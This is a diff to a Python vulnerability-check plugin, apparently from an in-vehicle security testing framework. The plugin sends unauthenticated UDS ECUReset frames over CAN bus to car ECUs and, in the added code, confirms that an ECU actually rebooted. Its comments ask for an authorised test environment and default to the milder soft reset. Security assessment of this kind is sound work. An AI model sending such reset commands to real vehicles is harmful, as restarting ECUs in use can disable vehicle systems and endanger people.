@@ -13,6 +13,7 @@ import sys
 import struct
 import time
 from iv_plugin_base import IVIVulnerabilityPlugin
+from can_bus_utils import format_can_settings, get_can_settings, open_can_bus
 
 try:
     import can
@@ -50,6 +51,14 @@ class UDSECUResetPlugin(IVIVulnerabilityPlugin):
     安全性: HardReset 会造成 ECU 短暂重启，测试前请确认已获得授权环境。
              SoftReset（01h）影响更小，默认优先测试 SoftReset。
     """
+    meta_poc_name = "UDS ECU Reset Unauthenticated"
+    meta_cve_id = "N/A"
+    meta_severity = "High"
+    meta_protocol = "can"
+    meta_target_os = ["all"]
+    meta_required_params = ["can_interface"]
+    is_disruptive = True
+    meta_destructive_level = "Restart"
 
     # UDS 功能寻址广播 ID（所有 ECU 均监听）
     UDS_FUNCTIONAL_REQ = 0x7DF
@@ -93,16 +102,35 @@ class UDSECUResetPlugin(IVIVulnerabilityPlugin):
             return False
         # 验证 CAN 接口可用
         try:
-            if "PCAN" in self.interface:
-                bus = can.interface.Bus(channel=self.interface, interface="pcan", bitrate=500000)
-            else:
-                bus = can.interface.Bus(channel=self.interface, bustype="socketcan")
+            settings = get_can_settings(self.params)
+            bus = open_can_bus(self.params)
             bus.shutdown()
-            self.logger.info(f"CAN 接口 {self.interface} 可用。")
+            self.logger.info(f"CAN 接口可用: {format_can_settings(settings)}")
             return True
         except Exception as e:
             self.logger.error(f"CAN 接口 {self.interface} 不可用: {e}")
             return False
+
+    def _verify_reset_effect(self, bus, req_id, name):
+        """在收到 ECUReset 正响应后，检查 ECU 是否经历短暂离线并恢复。"""
+        self.logger.info(f"  [*] 验证 {name} 是否出现复位行为...")
+        immediate_probe = self._send_uds(
+            bus, req_id,
+            [0x02, self.SID_DIAG_SESSION, 0x01],
+            timeout=0.6,
+        )
+        time.sleep(1.2)
+        recovery_probe = self._send_uds(
+            bus, req_id,
+            [0x02, self.SID_DIAG_SESSION, 0x01],
+            timeout=1.2,
+        )
+        immediate = self._parse_uds_response(immediate_probe)
+        recovery = self._parse_uds_response(recovery_probe)
+        reboot_observed = immediate[0] == "timeout" and recovery[0] == "session_ok"
+        if reboot_observed:
+            return True, "positive reset response followed by temporary silence and fresh session response"
+        return False, f"reset accepted but reboot effect not confirmed (immediate={immediate}, recovery={recovery})"
 
     def _send_uds(self, bus, arb_id, data, timeout=1.5):
         """发送 UDS 请求帧并等待响应，返回响应 CAN message 或 None"""
@@ -176,10 +204,8 @@ class UDSECUResetPlugin(IVIVulnerabilityPlugin):
         iface = self.interface
 
         try:
-            if "PCAN" in iface:
-                bus = can.interface.Bus(channel=iface, interface="pcan", bitrate=500000)
-            else:
-                bus = can.interface.Bus(channel=iface, bustype="socketcan")
+            settings = get_can_settings(self.params)
+            bus = open_can_bus(self.params)
         except Exception as e:
             self.logger.error(f"无法打开 CAN 接口: {e}")
             self.results["evidence"] = f"CAN 接口 {iface} 打开失败: {e}"
@@ -191,7 +217,7 @@ class UDSECUResetPlugin(IVIVulnerabilityPlugin):
         reset_type = self.RESET_SOFT
         reset_name = "SoftReset(01)"
         self.logger.info(
-            f"[*] 开始 UDS ECU Reset 未授权检测 (接口={iface}, 复位类型={reset_name})"
+            f"[*] 开始 UDS ECU Reset 未授权检测 (接口={format_can_settings(settings)}, 复位类型={reset_name})"
         )
 
         try:
@@ -218,10 +244,16 @@ class UDSECUResetPlugin(IVIVulnerabilityPlugin):
                 result = self._parse_uds_response(resp)
 
                 if result[0] == 'positive':
-                    self.logger.warning(
-                        f"  [!!!] {name} 接受 ECUReset！返回正响应 0x51 0x{result[1]:02X}"
-                    )
-                    vulnerable_ecus.append((req_id, name, "正响应 0x51"))
+                    verified, verification_note = self._verify_reset_effect(bus, req_id, name)
+                    if verified:
+                        self.logger.warning(
+                            f"  [!!!] {name} 接受 ECUReset 且确认发生复位。"
+                        )
+                        vulnerable_ecus.append((req_id, name, verification_note))
+                    else:
+                        self.logger.info(
+                            f"  [*] {name} 返回正响应，但未自动确认到复位效应: {verification_note}"
+                        )
                 elif result[0] == 'negative':
                     nrc_hex = f"0x{result[2]:02X}" if len(result) > 2 else "?"
                     nrc_name = {
@@ -279,8 +311,9 @@ class UDSECUResetPlugin(IVIVulnerabilityPlugin):
 
 
 if __name__ == "__main__":
-    if len(sys.argv) < 3:
-        print("Usage: python3 31_UDS_ECU_Reset_Unauth.py <args>")
+    if len(sys.argv) < 2:
+        print("Usage: python3 31_UDS_ECU_Reset_Unauth.py <can_interface>")
         sys.exit(1)
-    plugin = UDSECUResetPlugin(config)
+    config = {"can_interface": sys.argv[1]}
+    plugin = UDSECUResetPlugin({"target_ip": "N/A", "can_interface": sys.argv[1]})
     plugin.run_verify()
